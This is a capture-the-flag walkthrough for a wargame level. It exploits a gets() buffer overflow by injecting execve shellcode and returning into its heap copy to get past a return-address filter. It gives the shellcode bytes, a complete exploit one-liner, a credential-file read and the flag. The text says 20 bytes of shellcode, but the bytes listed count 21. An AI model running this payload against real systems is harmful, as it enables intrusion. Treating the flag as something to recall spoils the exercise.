# Level2 Walkthrough

## Vulnerability Analysis

This level demonstrates **shellcode injection** with **exploit mitigation bypass**.

### Source Code Analysis
```c
void p(void)
{
  uint unaff_retaddr;
  char local_50 [76];

  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 2952790016) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}
```

### Key Vulnerabilities & Protections
1. **Buffer Overflow**: `gets()` has no bounds checking
2. **Return Address Protection**: Blocks addresses starting with `0xb` (libc region)
3. **Heap Allocation**: `strdup()` copies input to heap memory
4. **No Stack Protection**: No canaries or ASLR enabled

## Exploitation Process

### Step 1: Identify Buffer Size and Protection
- Buffer overflow offset: 80 bytes
- Protection blocks libc addresses (0xb7xxxxxx)
- Need alternative execution target

### Step 2: Find Heap Address
```bash
# strdup() allocates heap memory at predictable address
# Heap address: 0x0804a008 (starts with 0x08 - not blocked!)
```

### Step 3: Craft Shellcode
Using optimized 20-byte execve shellcode:
```assembly
xor ecx, ecx        ; Clear ECX
mul ecx             ; Clear EAX and EDX
push eax            ; Push NULL terminator
push 0x68732f2f     ; Push "//sh"
push 0x6e69622f     ; Push "/bin"
mov ebx, esp        ; EBX = "/bin//sh"
mov al, 0x0b        ; EAX = 11 (execve syscall)
int 0x80            ; Execute syscall
```

### Step 4: Build Exploit Payload
```bash
# Payload structure: [shellcode] + [padding] + [heap_address]
(python -c "
shellcode = '\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
padding = 'a' * (80 - len(shellcode))
heap_addr = '\x08\xa0\x04\x08'
print(shellcode + padding + heap_addr)
"; cat) | ./level2
```

### Step 5: Execute and Retrieve Flag
```bash
# After gaining shell access:
cat /home/user/level3/.pass
# Flag: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Technical Details

### Attack Vector
- **Type**: Stack-based buffer overflow with shellcode injection
- **Method**: Return address overwrite to heap
- **Target**: Heap memory containing injected shellcode

### Exploit Mechanics
1. Inject shellcode at beginning of input buffer
2. Fill remaining 60 bytes with padding
3. Overwrite return address with heap address (0x0804a008)
4. `strdup()` copies shellcode to heap
5. When `p()` returns, execution jumps to heap
6. Shellcode executes `execve("/bin/sh")`

### Security Mitigations Bypassed
- **Return Address Filtering**: Bypassed using heap address instead of libc
- **No DEP/NX**: Heap memory is executable
- **No ASLR**: Heap addresses are predictable

### Protection Analysis
The protection mechanism `(unaff_retaddr & 0xb0000000) == 0xb0000000` specifically targets:
- libc function addresses (0xb7xxxxxx)
- Stack addresses (0xbfxxxxxx)

But allows:
- Heap addresses (0x08xxxxxx)
- Text segment addresses (0x08xxxxxx)

## Result
- **Flag**: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
- **Access Level**: level3 user privileges
- **Technique Learned**: Shellcode injection and mitigation bypass